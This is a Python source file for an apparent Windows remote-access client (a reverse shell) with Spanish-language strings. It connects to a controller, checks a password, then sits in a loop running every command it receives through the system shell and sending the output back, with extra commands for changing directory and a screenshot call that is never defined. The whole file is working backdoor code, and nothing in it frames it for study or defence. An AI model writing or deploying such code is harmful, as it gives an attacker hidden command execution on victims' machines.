from socket import socket, AF_INET, SOCK_STREAM
import win32com.client as comclt
from os import getcwd, chdir
from subprocess import Popen, PIPE
from sys import argv, exit

class Client:
    def __init__(self, host, port, passw):
        self.passw = passw
        self.wsh = comclt.Dispatch("WScript.Shell")
        self.address = host, int(port)
        self.ip, self.port = self.address
        self.sock = socket(AF_INET, SOCK_STREAM)

    def verify(self):
        data = 'login:' + self.passw
        self.sock.send(data.encode())
        res = self.sock.recv(1024).decode('utf-8').strip()
        if res != 'sexo': return self.close()
        return self.wait()

    # current working directory
    def cwd(self):
        return getcwd()
    
    # change directory
    def cd(self, path):
        try: chdir(path)
        except: return 'error'
        return getcwd()
    
    # execute cmd
    def cmd(self, command):
        process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        response = process.stdout.read() + process.stderr.read()
        return response if response else 'ejecutado'
    
    def check_command(self, command):
        splitted = command.split('-')

        if len(splitted) > 1: #check with arguments
            if splitted[0] == 'cd': return self.cd(splitted[1])
            if splitted[0] == 'cmd': return self.cmd(splitted[1])
        
        else: # check without args
            if command == 'salir': return self.close()
            if command == 'cwd': return self.cwd()
            if command == 'scr': return self.screenshot()
    
    def wait(self):
        while True:
            data = self.sock.recv(1024).decode('utf-8')
            print('data recibido:', data)
            res = self.check_command(data) if data else 'no command'
            if isinstance(res, bytes):
                self.sock.send(res)
            else:
                self.sock.send(res.encode())
        
    def connect(self):
        try: self.sock.connect(self.address)
        except: print('Error on connect')
        self.verify()
    
    def close(self):
        self.sock.close()
        return exit()

if __name__ == "__main__":
    #if len(argv) != 4: exit()
    #_, host, port, passw = tuple(argv)
    henri = Client('localhost', 8080, 'papa')
    henri.connect()
